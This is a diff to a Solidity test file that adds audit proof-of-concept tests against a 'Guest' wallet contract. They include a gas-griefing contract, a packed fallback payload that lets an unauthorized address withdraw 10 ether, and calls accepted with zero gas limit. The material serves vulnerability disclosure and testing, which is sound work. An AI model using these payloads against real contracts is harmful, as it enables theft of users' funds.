@@ -25,6 +25,24 @@ function toDecodedGuestPayload(
   d.nonce = p.nonce;
 }
 
+contract GasGriefer {
+
+  uint256[] private data;
+
+  function expensiveStorage() external {
+    // Write to storage - very expensive (~20,000 gas per write)
+    for (uint256 i = 0; i < 1000; i++) {
+      data.push(i); // ~20,000 gas per push
+    }
+
+    // Additional expensive operations
+    for (uint256 i = 0; i < data.length; i++) {
+      data[i] = data[i] * 2; // ~5,000 gas per update
+    }
+  }
+
+}
+
 contract GuestTest is AdvTest {
 
   Guest public guest;
@@ -69,8 +87,58 @@ contract GuestTest is AdvTest {
     assertTrue(ok);
   }
 
-
   //@audit-poc
+  function test_guest_fallback_with_gas_griefing_attack() external {
+    uint8 globalFlag = 0x11; // 00010001 binary
+    address randomAddress = makeAddr("random address");
+    address[] memory parentWallets = new address[](0);
+    Payload.Call[] memory calls = new Payload.Call[](1);
+    GasGriefer gasGriefer = new GasGriefer();
+    calls[0] = Payload.Call({
+      to: address(gasGriefer),
+      value: uint256(0),
+      data: bytes(""),
+      gasLimit: uint256(0),
+      delegateCall: false,
+      onlyFallback: false,
+      behaviorOnError: uint256(3)
+    });
+    Payload.Decoded memory decodedNew = Payload.Decoded({
+      kind: Payload.KIND_TRANSACTIONS,
+      noChainId: false,
+      // Transaction kind
+      calls: calls,
+      space: uint256(0),
+      nonce: uint256(0),
+      // Message kind
+      message: bytes(""),
+      // Config update kind
+      imageHash: bytes32(0),
+      // Digest kind for 1271
+      digest: bytes32(0),
+      // Parent wallets
+      parentWallets: parentWallets
+    });
+    // Call flags = 0xC0 to 0xC3 for behaviorOnError = 3
+    // We want self call to avoid providing address, so bit 0 = 1
+    // behaviorOnError = 3 → bits 6-7 = 11
+    // So: 11000001 = 0xC1
+    uint8 callFlags = 0xC2; // Self call + behaviorOnError = 3
+    bytes memory packed = abi.encodePacked(
+      uint8(globalFlag), // 0x11
+      uint8(callFlags), // 0xC2
+      randomAddress,
+      uint256(100000000000000000) //0.1 ether
+    );
+
+    bytes32 opHash = Payload.hashFor(decodedNew, address(guest));
+    vm.expectEmit(true, true, true, true);
+    emit CallSucceeded(opHash, 0);
+    vm.prank(address(guest));
+    (bool ok,) = address(guest).call(packed);
+    assertTrue(ok);
+  }
+
   function test_fallback_Success_With_Invalid_Behavior_On_Error_set_as_3() external {
     uint8 globalFlag = 0x11; // 00010001 binary
     address randomAddress = makeAddr("random address");
@@ -112,7 +180,7 @@ contract GuestTest is AdvTest {
       randomAddress,
       uint256(100000000000000000)
     );
-    
+
     bytes32 opHash = Payload.hashFor(decodedNew, address(guest));
     vm.expectEmit(true, true, true, true);
     emit CallSucceeded(opHash, 0);
@@ -121,18 +189,68 @@ contract GuestTest is AdvTest {
     assertTrue(ok);
   }
 
+  //@audit-poc
+  function test_fallback_For_Funds_Withdrawal_By_UnAuthorized_Users() external {
+    uint8 globalFlag = 0x11; // 00010001 binary
+    address myAddress = makeAddr("my address");
+    vm.deal(myAddress, 0);
+    address[] memory parentWallets = new address[](0);
+    Payload.Call[] memory calls = new Payload.Call[](1);
+    calls[0] = Payload.Call({
+      to: myAddress,
+      value: uint256(10000000000000000000), //10 ether
+      data: bytes(""),
+      gasLimit: uint256(0),
+      delegateCall: false,
+      onlyFallback: false,
+      behaviorOnError: uint256(0)
+    });
+    Payload.Decoded memory decodedNew = Payload.Decoded({
+      kind: Payload.KIND_TRANSACTIONS,
+      noChainId: false,
+      // Transaction kind
+      calls: calls,
+      space: uint256(0),
+      nonce: uint256(0),
+      // Message kind
+      message: bytes(""),
+      // Config update kind
+      imageHash: bytes32(0),
+      // Digest kind for 1271
+      digest: bytes32(0),
+      // Parent wallets
+      parentWallets: parentWallets
+    });
+
+    uint8 callFlags = 0x02; // call has only value
+    bytes memory packed = abi.encodePacked(
+      uint8(globalFlag), // 0x11
+      uint8(callFlags), // 0x02
+      myAddress,
+      uint256(10000000000000000000) //10 ether
+    );
+
+    bytes32 opHash = Payload.hashFor(decodedNew, address(guest));
+    vm.expectEmit(true, true, true, true);
+    emit CallSucceeded(opHash, 0);
+    uint256 guestInitialBalance = 20 ether;
+    hoax(address(guest), guestInitialBalance);
+    (bool ok,) = address(guest).call(packed);
+    assertTrue(ok);
+    assertEq(address(guest).balance, 10 ether, "Guest balance not reduced");
+    assertEq(myAddress.balance, 10 ether, "Balance not received");
+  }
+
   function test_notEnoughGas(GuestPayload memory p, uint256 callIndex) external {
     vm.assume(p.calls.length > 0);
     callIndex = bound(callIndex, 0, p.calls.length - 1);
 
     Payload.Decoded memory decoded = toDecodedGuestPayload(p);
     boundToLegalPayload(decoded);
-
     for (uint256 i = 0; i < decoded.calls.length; i++) {
       decoded.calls[i].to = boundNoPrecompile(decoded.calls[i].to);
       decoded.calls[i].value = 0;
       decoded.calls[i].delegateCall = false;
-
       if (i == callIndex) {
         // Only set high gas limit for the specified call
         uint256 gasLimit = bound(decoded.calls[i].gasLimit, gasleft() + 1, type(uint256).max);
@@ -143,10 +261,28 @@ contract GuestTest is AdvTest {
         decoded.calls[i].gasLimit = bound(decoded.calls[i].gasLimit, 0, 1_000_000_000);
       }
     }
+    vm.expectRevert();
+    bytes memory packed = PrimitivesRPC.toPackedPayload(vm, decoded);
+    (bool ok,) = address(guest).call(packed);
+    assertTrue(ok);
+  }
+
+  //@audit-poc
+  function test_Call_Succeeded_With_Zero_GasLimit(GuestPayload memory p, uint256 callIndex) external {
+    vm.assume(p.calls.length > 0);
+    callIndex = bound(callIndex, 0, p.calls.length - 1);
+
+    Payload.Decoded memory decoded = toDecodedGuestPayload(p);
+    boundToLegalPayload(decoded);
+    console2.log("decoded.calls: ", decoded.calls.length);
+    for (uint256 i = 0; i < decoded.calls.length; i++) {
+      decoded.calls[i].to = boundNoPrecompile(decoded.calls[i].to);
+      decoded.calls[i].value = 0;
+      decoded.calls[i].delegateCall = false;
+      decoded.calls[i].gasLimit = 0;
+    }
 
     bytes memory packed = PrimitivesRPC.toPackedPayload(vm, decoded);
-
-    vm.expectRevert();
     (bool ok,) = address(guest).call(packed);
     assertTrue(ok);
   }
